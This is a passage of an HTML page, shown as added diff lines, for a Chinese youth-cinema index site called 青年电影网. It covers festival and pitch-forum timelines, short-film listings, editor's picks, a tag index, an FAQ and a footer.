+            </tr>
+            <tr>
+              <td><span class="nm">海边没有冬天<small>阿依努尔 执导 · 首部短片集</small></span></td>
+              <td class="yr hide">2025</td>
+              <td class="tg hide"><i>短片集</i><i>地域</i><span>中国大陆</span></td>
+              <td class="hide">六段故事，同一片海</td>
+              <td><span class="st end">展映结束</span></td>
+            </tr>
+            <tr>
+              <td><span class="nm">三个人的房间<small>黄桉 执导 · 第二部长片</small></span></td>
+              <td class="yr hide">2025</td>
+              <td class="tg hide"><i>剧情</i><i>爱情</i><span>中国台湾</span></td>
+              <td class="hide">90% 场景在一间出租屋</td>
+              <td><span class="st end">已下映</span></td>
+            </tr>
+          </tbody>
+        </table>
+        <div class="pager">
+          <a href="#" class="on">1</a><a href="#">2</a><a href="#">3</a><a href="#">4</a><a href="#">5</a>
+          <a href="#" class="w">下一页 →</a>
+        </div>
+      </div>
+    </section>
+
+    <!-- 影展与创投 -->
+    <section id="fest">
+      <div class="kicker">
+        <span class="no">No.05</span>
+        <h2>影展与创投</h2>
+        <span class="sub"><a href="#">全部日程 #</a> · <a href="#">征片信息 #</a></span>
+      </div>
+      <div class="section">
+        <div class="note">
+          <span class="k">提示</span>
+          <span>以下时间为整理后的公开信息，征片截止日与展映排片可能变动，请以各影展官方公告为准。本站仅作信息索引，不代理任何报名与投片事务。</span>
+        </div>
+        <div class="timeline" style="margin-top:22px">
+          <div class="it">
+            <div class="when">10.12 — 10.20</div>
+            <h4>平遥国际电影展 · 藏龙单元</h4>
+            <p>本年度华语新人导演长片的主要集中地，藏龙单元共 12 部，其中 4 部为导演处女作。展映排片以单场为主，建议提前锁定场次。</p>
+          </div>
+          <div class="it o">
+            <div class="when">10.18 — 10.27</div>
+            <h4>First 青年电影展 · 短片周</h4>
+            <p>短片竞赛、训练营与实验室同步进行，是短片创作者与制片资源对接的高密度时段。今年短片竞赛入围 28 部。</p>
+          </div>
+          <div class="it p">
+            <div class="when">11.05 截止</div>
+            <h4>青年导演扶持计划 2027 征片</h4>
+            <p>面向尚未完成首部长片或已完成首部长片的青年导演，征集剧本与项目计划书。评审关注制作可行性而非故事完成度。</p>
+          </div>
+          <div class="it o">
+            <div class="when">11.15 — 11.24</div>
+            <h4>金鸡电影创投大会</h4>
+            <p>创投项目路演与制作中项目推介并行，是寻找制片、发行与后期资源的常规渠道。需提前完成项目注册。</p>
+          </div>
+          <div class="it">
+            <div class="when">12.02 — 12.09</div>
+            <h4>海南岛国际电影节 · 新人荣誉</h4>
+            <p>新人荣誉单元专注青年导演的首部或第二部作品，展映与市场活动同期进行。</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 短片展映 -->
+    <section id="short">
+      <div class="kicker">
+        <span class="no">No.06</span>
+        <h2>短片展映</h2>
+        <span class="sub"><a href="#">全部短片 #</a> · <a href="#">投稿短片 #</a></span>
+      </div>
+      <div class="tiles">
+        <div class="tile">
+          <div class="dur">DUR. 22 MIN</div>
+          <h4>母亲的房门</h4>
+          <p>毕业作品。镜头始终保持在门框之外，母亲与女儿之间那句始终没说出口的话，靠声音与脚步完成。</p>
+        </div>
+        <div class="tile">
+          <div class="dur">DUR. 15 MIN</div>
+          <h4>最后一次排练</h4>
+          <p>一支高中合唱团在比赛前的最后一次排练。没有台词，只有声音、眼神与迟到的成员。</p>
+        </div>
+        <div class="tile">
+          <div class="dur">DUR. 31 MIN</div>
+          <h4>海边没有冬天</h4>
+          <p>六段故事共用一片海。小镇青年的离开与归来被处理成同一种动作。</p>
+        </div>
+        <div class="tile">
+          <div class="dur">DUR. 09 MIN</div>
+          <h4>三号线早高峰</h4>
+          <p>动画短片。整条片子只有一列车厢与六种通勤情绪，没有任何对白。</p>
+        </div>
+        <div class="tile">
+          <div class="dur">DUR. 26 MIN</div>
+          <h4>修理父亲的表</h4>
+          <p>儿子接手父亲留下的修表铺，第一年只修好了一只表。一段关于手艺与时间的记录。</p>
+        </div>
+        <div class="tile">
+          <div class="dur">DUR. 18 MIN</div>
+          <h4>出租屋的雨季</h4>
+          <p>三位合租者、一间漏水房间、一个雨季。低成本实拍，声音设计由导演本人完成。</p>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- ========== 右栏 ========== -->
+  <aside class="right">
+
+    <div class="rblk" id="stat">
+      <div class="kh">本期数字 <span>FIGURES</span></div>
+      <div class="section solid" style="padding:22px">
+        <div class="figs">
+          <div class="fig"><div class="n">386<small>位</small></div><div class="l">本年度跟踪的青年导演</div></div>
+          <div class="fig"><div class="n">142<small>部</small></div><div class="l">新片条目 · 含短片与纪录</div></div>
+          <div class="fig"><div class="n">27<small>场</small></div><div class="l">影展与创投动态</div></div>
+          <div class="fig"><div class="n">6<small>篇</small></div><div class="l">本周新刊作者写作</div></div>
+        </div>
+        <div class="note g" style="margin-top:18px;background:rgba(255,255,255,.06);border-color:var(--olive);color:#c9c2b4">
+          <span class="k">说明</span>
+          <span>以上为本期内容统计，仅反映本站编辑与整理的工作量，不代表行业规模，也不构成对作品质量的评价。</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="rblk">
+      <div class="kh">本日推荐 <span>EDITOR'S PICK</span></div>
+      <ul class="mini">
+        <li><a href="#"><span class="t">当主角不再解释自己的选择：今年最值得讨论的三部新人作品</span><span class="b"><i>头条</i>10.09 · 8 分钟</span></a></li>
+        <li><a href="#"><span class="t">从短片到长片：四位导演谈「撑住」这件事</span><span class="b"><i>访谈</i>10.08 · 6 分钟</span></a></li>
+        <li><a href="#"><span class="t">低预算不是风格：成本约束如何变成叙事节奏</span><span class="b"><i>评论</i>10.07 · 5 分钟</span></a></li>
+        <li><a href="#"><span class="t">创投评审最常问的三个问题，以及为什么</span><span class="b"><i>行业</i>10.06 · 7 分钟</span></a></li>
+        <li><a href="#"><span class="t">短片没有观众吗？我们统计了今年的展映场次</span><span class="b"><i>数据</i>10.05 · 4 分钟</span></a></li>
+      </ul>
+      <div class="pager">
+        <a href="#" class="on">1</a><a href="#">2</a><a href="#">3</a><a href="#" class="w">下一页 →</a>
+      </div>
+    </div>
+
+    <div class="rblk">
+      <div class="kh">读者之声 <span>VOICE</span></div>
+      <div class="quote">
+        <p>我在这里第一次意识到，青年电影不是一种类型，而是一种处境——创作者、人物和观众，处在同一种「尚未被定义」的状态里。</p>
+        <cite>—— 读者来信 · 来自武汉 · 2026.09.28</cite>
+      </div>
+      <div class="note p" style="margin-top:14px">
+        <span class="k">征稿</span>
+        <span>青年电影网长期接受青年影评、导演手记与观影笔记投稿。来稿请附真实署名与联系方式，一经采用将在「作者写作」栏目署名刊发。<a href="#about" style="color:var(--plum);border-bottom:1px solid rgba(122,59,79,.4)">了解投稿要求 #</a></span>
+      </div>
+    </div>
+
+    <div class="rblk" id="tag">
+      <div class="kh">题材索引 <span>INDEX</span></div>
+      <div class="cloud">
+        <a href="#" class="xl">处女作</a>
+        <a href="#" class="lg">短片</a>
+        <a href="#">纪录片</a>
+        <a href="#" class="lg">青年导演</a>
+        <a href="#">毕业作品</a>
+        <a href="#" class="md">创投</a>
+        <a href="#">影展</a>
+        <a href="#" class="lg">低成本</a>
+        <a href="#">独立制片</a>
+        <a href="#" class="md">艺术电影</a>
+        <a href="#">校园</a>
+        <a href="#">小镇青年</a>
+        <a href="#">职场新人</a>
+        <a href="#" class="lg">女性导演</a>
+        <a href="#">少数民族</a>
+        <a href="#">方言电影</a>
+        <a href="#">非虚构</a>
+        <a href="#">修复重映</a>
+        <a href="#">动画短片</a>
+        <a href="#">学生作品</a>
+        <a href="#">影评写作</a>
+        <a href="#">幕后制作</a>
+      </div>
+      <div class="note g" style="margin-top:14px">
+        <span class="k">用法</span>
+        <span>点击题材标签可进入对应片单。建议先从「处女作」与「短片」两个入口进入，这是本站的两条主干内容线。</span>
+      </div>
+    </div>
+
+    <div class="rblk" id="faq">
+      <div class="kh">读者问答 <span>FAQ</span></div>
+      <details class="f" open>
+        <summary><span class="q">Q</span>青年电影网是做什么的？<span class="ar">▾</span></summary>
+        <div class="an">青年电影网（官网 <a href="https://qingniandianyingwang-zh.github.io">https://qingniandianyingwang-zh.github.io</a>）是一个面向青年群体与独立电影爱好者的内容平台，长期聚焦青年导演处女作、青年题材影像、短片与纪录片、校园影展、创投项目、电影节入围动态与青年影评人写作。本站只做内容整理与索引，不提供播放、下载或资源托管服务。</div>
+      </details>
+      <details class="f">
+        <summary><span class="q">Q</span>为什么内容里没有在线观看入口？<span class="ar">▾</span></summary>
+        <div class="an">本站是内容索引与参考类站点，不是播放平台。影片的观看渠道会随版权周期变化，为避免给出过期信息，我们只整理作品资料、展映信息与市场动态，观看请通过正规院线与正版授权平台。</div>
+      </details>
+      <details class="f">
+        <summary><span class="q">Q</span>青年导演或新人作品怎么投稿？<span class="ar">▾</span></summary>
+        <div class="an">可在「读者之声」栏目提交作品资料，包括片名、导演、年份、片长、题材、获奖或入围情况与观看方式。编辑组在五个工作日内回复是否收录，并在收录后保留完整署名。</div>
+      </details>
+      <details class="f">
+        <summary><span class="q">Q</span>影展征片信息为什么可能和官网不一致？<span class="ar">▾</span></summary>
+        <div class="an">征片截止日与展映排片属于易变动信息，官网更新往往晚于公告。本站以整理时间点为标注依据，并在每条信息下方注明来源日期，建议以各影展官网最新公告为最终依据。</div>
+      </details>
+      <details class="f">
+        <summary><span class="q">Q</span>转载本站内容需要注意什么？<span class="ar">▾</span></summary>
+        <div class="an">个人与非商业用途请保留「青年电影网」署名与原文链接；商业用途、全文转载或翻译需另行联系取得授权。本站正式名称为青年电影网，官网地址为 https://qingniandianyingwang-zh.github.io。</div>
+      </details>
+    </div>
+
+    <div class="rblk about" id="about">
+      <div class="kh">关于本站 <span>COLOPHON</span></div>
+      <dl>
+        <dt>正式名称</dt><dd>青年电影网</dd>
+        <dt>内容定位</dt><dd>青年影像内容索引</dd>
+        <dt>官网地址</dt><dd class="url">https://qingniandianyingwang-zh.github.io</dd>
+        <dt>内容范围</dt><dd>电影 / 短片 / 纪录片</dd>
+        <dt>栏目构成</dt><dd>头条 · 新片 · 访谈 · 片单 · 影展 · 短片</dd>
+        <dt>更新频率</dt><dd>每日更新 · 每周专题</dd>
+        <dt>服务对象</dt><dd>青年观众 · 创作者</dd>
+        <dt>服务性质</dt><dd>内容整理 · 不涉及播放</dd>
+      </dl>
+      <div class="note" style="margin-top:16px">
+        <span class="k">声明</span>
+        <span>本站所有影片资料与行业信息均整理自公开来源，仅供选片参考与资料查阅，不构成评价结论或投资建议。影片信息以官方公布为准，请通过正规渠道观看与支持正版。</span>
+      </div>
+    </div>
+
+  </aside>
+</div>
+
+<footer>
+  <div class="in">
+    <div class="cols">
+      <div class="brand">
+        <div class="word">青年电影网<em>YOUTH CINEMA</em></div>
+        <div class="en">Youth Film Network</div>
+        <p>青年电影网聚焦青年导演处女作、青年题材影像、短片与纪录片、校园影展、创投项目、电影节入围动态与青年影评人写作，为关注新人新作与独立表达的观众提供持续更新的索引与参考。</p>
+        <span class="u">官网：https://qingniandianyingwang-zh.github.io</span>
+      </div>
+      <div>
+        <h5>内容栏目</h5>
+        <ul>
+          <li><a href="#lede">头条观察 #</a></li>
+          <li><a href="#new">新片速递 #</a></li>
+          <li><a href="#talk">导演访谈 #</a></li>
+          <li><a href="#list">片单与榜单 #</a></li>
+          <li><a href="#fest">影展与创投 #</a></li>
+          <li><a href="#short">短片展映 #</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>检索与索引</h5>
+        <ul>
+          <li><a href="#tag">题材索引 #</a></li>
+          <li><a href="#">按年份检索 #</a></li>
+          <li><a href="#">按地区检索 #</a></li>
+          <li><a href="#">按导演检索 #</a></li>
+          <li><a href="#">短片专题 #</a></li>
+          <li><a href="#">纪录片专题 #</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>关于与帮助</h5>
+        <ul>
+          <li><a href="#about">关于本站 #</a></li>
+          <li><a href="#about">投稿与联系 #</a></li>
+          <li><a href="#faq">读者问答 #</a></li>
+          <li><a href="#">版权与转载 #</a></li>
+          <li><a href="#">内容纠错 #</a></li>
+          <li><a href="#lede">回到页首 ↑</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="legal">
+      <div>© 2026 青年电影网 ｜ 聚焦青年导演、青年题材与青年观众的独立电影内容平台<br>正式名称：青年电影网 ｜ 官网 https://qingniandianyingwang-zh.github.io ｜ 本站内容仅供选片参考与资料查阅</div>
+      <div class="r">青年电影网（https://qingniandianyingwang-zh.github.io）<br>请通过正规院线与正版授权平台观看与支持正版</div>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
